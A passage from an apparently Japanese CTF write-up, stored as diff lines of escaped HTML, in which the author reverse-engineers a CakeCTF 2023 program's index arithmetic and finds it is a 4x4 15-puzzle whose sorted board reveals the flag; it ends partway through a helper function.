class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">e_index&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">s1&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">s2&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">, &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">]&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">s2&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;U: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">, &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;R: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">, &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;D: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">, &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;L: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">, &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">q&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;span class="n">s1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;span class="k">while&lt;/span> &lt;span class="kc">True&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="mi">2&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">s1&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">s2&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]:&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">M&lt;/span>&lt;span class="p">[((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]:&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">M&lt;/span>&lt;span class="p">[((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">M&lt;/span>&lt;span class="p">[(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;span class="n">s1&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">q_index&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;span class="n">s1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;span class="k">while&lt;/span> &lt;span class="kc">True&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="mi">2&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">s1&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">s2&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="nb">print&lt;/span>&lt;span class="p">(((&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;span class="n">s1&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;span class="k">def&lt;/span> &lt;span class="nf">f&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i2&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="c1"># exchange i1, i2 -&amp;gt; i2, i1&lt;/span>
+&lt;span class="n">i1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">i1&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="n">i2&lt;/span>
+&lt;span class="n">i2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">i2&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="n">i1&lt;/span>
+&lt;span class="n">i1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">i1&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="n">i2&lt;/span>
+&lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">i1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>まず、&lt;code>q&lt;/code>関数でどこのインデックスで比較しているかを&lt;code>q_index&lt;/code>メソッドを実行して確認します。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">[0]
+&amp;lt;s1=0, s2=0&amp;gt;
+M[4] &amp;gt;= M[0]
+M[16] &amp;gt;= M[0]
+&amp;lt;s1=0, s2=1&amp;gt;
+M[8] &amp;gt;= M[4]
+M[20] &amp;gt;= M[4]
+&amp;lt;s1=0, s2=2&amp;gt;
+M[12] &amp;gt;= M[8]
+M[24] &amp;gt;= M[8]
+[1]
+&amp;lt;s1=1, s2=0&amp;gt;
+M[20] &amp;gt;= M[16]
+M[32] &amp;gt;= M[16]
+&amp;lt;s1=1, s2=1&amp;gt;
+M[24] &amp;gt;= M[20]
+M[36] &amp;gt;= M[20]
+&amp;lt;s1=1, s2=2&amp;gt;
+M[28] &amp;gt;= M[24]
+M[40] &amp;gt;= M[24]
+[2]
+&amp;lt;s1=2, s2=0&amp;gt;
+M[36] &amp;gt;= M[32]
+M[48] &amp;gt;= M[32]
+&amp;lt;s1=2, s2=1&amp;gt;
+M[40] &amp;gt;= M[36]
+M[52] &amp;gt;= M[36]
+&amp;lt;s1=2, s2=2&amp;gt;
+M[44] &amp;gt;= M[40]
+M[56] &amp;gt;= M[40]
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>これだけだとよくわからないので、ハッセ図でまとめます。
+&lt;img src="https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/puzzle_hasse.jpg"
+width="1941"
+height="1957"
+srcset="https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/puzzle_hasse_hud13026777a0573e19b13b46596cef46c_285862_480x0_resize_q75_box.jpg 480w, https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/puzzle_hasse_hud13026777a0573e19b13b46596cef46c_285862_1024x0_resize_q75_box.jpg 1024w"
+loading="lazy"
+alt="q関数 ハッセ図"
+class="gallery-image"
+data-flex-grow="99"
+data-flex-basis="238px"
+>
+とてもきれいなパターンが出てきました。このハッセ図から0から56まで昇順でソートすれば&lt;code>q&lt;/code>関数は0を返してくれることが分かります。&lt;/p>
+&lt;p>次に、&lt;code>e&lt;/code>関数ではどのようなインデックスで交換を行っているか&lt;code>e_index&lt;/code>メソッドを実行して確認します。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;span class="lnt">66
+&lt;/span>&lt;span class="lnt">67
+&lt;/span>&lt;span class="lnt">68
+&lt;/span>&lt;span class="lnt">69
+&lt;/span>&lt;span class="lnt">70
+&lt;/span>&lt;span class="lnt">71
+&lt;/span>&lt;span class="lnt">72
+&lt;/span>&lt;span class="lnt">73
+&lt;/span>&lt;span class="lnt">74
+&lt;/span>&lt;span class="lnt">75
+&lt;/span>&lt;span class="lnt">76
+&lt;/span>&lt;span class="lnt">77
+&lt;/span>&lt;span class="lnt">78
+&lt;/span>&lt;span class="lnt">79
+&lt;/span>&lt;span class="lnt">80
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">[0, 0]
+U: 0, -16
+R: 0, 4
+D: 0, 16
+L: 0, -4
+[0, 1]
+U: 4, -12
+R: 4, 8
+D: 4, 20
+L: 4, 0
+[0, 2]
+U: 8, -8
+R: 8, 12
+D: 8, 24
+L: 8, 4
+[0, 3]
+U: 12, -4
+R: 12, 16
+D: 12, 28
+L: 12, 8
+[1, 0]
+U: 16, 0
+R: 16, 20
+D: 16, 32
+L: 16, 12
+[1, 1]
+U: 20, 4
+R: 20, 24
+D: 20, 36
+L: 20, 16
+[1, 2]
+U: 24, 8
+R: 24, 28
+D: 24, 40
+L: 24, 20
+[1, 3]
+U: 28, 12
+R: 28, 32
+D: 28, 44
+L: 28, 24
+[2, 0]
+U: 32, 16
+R: 32, 36
+D: 32, 48
+L: 32, 28
+[2, 1]
+U: 36, 20
+R: 36, 40
+D: 36, 52
+L: 36, 32
+[2, 2]
+U: 40, 24
+R: 40, 44
+D: 40, 56
+L: 40, 36
+[2, 3]
+U: 44, 28
+R: 44, 48
+D: 44, 60
+L: 44, 40
+[3, 0]
+U: 48, 32
+R: 48, 52
+D: 48, 64
+L: 48, 44
+[3, 1]
+U: 52, 36
+R: 52, 56
+D: 52, 68
+L: 52, 48
+[3, 2]
+U: 56, 40
+R: 56, 60
+D: 56, 72
+L: 56, 52
+[3, 3]
+U: 60, 44
+R: 60, 64
+D: 60, 76
+L: 60, 56
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>インデックスを表しているのに負の数を返しているものや範囲外のインデックスになるものがありますが、&lt;code>e&lt;/code>関数の条件でこれらは弾かれることが分かります。&lt;code>s&lt;/code>関数は&lt;code>M&lt;/code>関数の0の位置を2次元のインデックスとして返しているようです。&lt;/p>
+&lt;p>以上の数値を見てみるとわかることは、全てのインデックスにおいて、Uを入力すると$4\times4$だけ値が減っている、Rを入力すると$1\times4$だけ値が増えている、Dを入力すると$4\times4$だけ値が増えている、Lを入力すると$1\times4$だけ値が減っていることです。&lt;/p>
+&lt;p>これらのことから、このプログラムは$4\times4$で構成される15パズルを表していることが分かります。具体的には、次のようなパズルがあり、0を移動させて、左上から値を昇順に並べることで、flagを得られるようなプログラムになっていることが分かります。&lt;code>M&lt;/code>はこのパズルの盤面だったようです。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">1146640091 1277362948 0002245791 1729795767
+1817593079 2146722439 1860814889 1557802610
+0000000000 1770948809 0870734415 1355570260
+0323584794 1405652852 0629508793 1928951512
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>これだと値が大きすぎて盤面の状態がよく分からないので、0から15までの値で以上の15パズルを表してみます。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">05 06 01 10
+12 15 13 09
+00 11 04 07
+02 08 03 14
+&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>これを左上から0から15で並べ替えていきます。多分効率のいいアルゴリズムはあると思いますが、プログラム書くより解いた方が速いと思い、人力で解きました。（結局、とても時間かかりました）&lt;/p>
+&lt;p>パズルを解きやすくすため、以下のコードを追加して、パズルを解いていきます。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">def&lt;/span> &lt;span class="nf">puzzle_index&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;span class="n">index&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">x&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)]&lt;/span>
+&lt;span class="n">puzzle&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;span class="k">if&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;span class="n">puzzle&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">M&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">])&lt;/span>
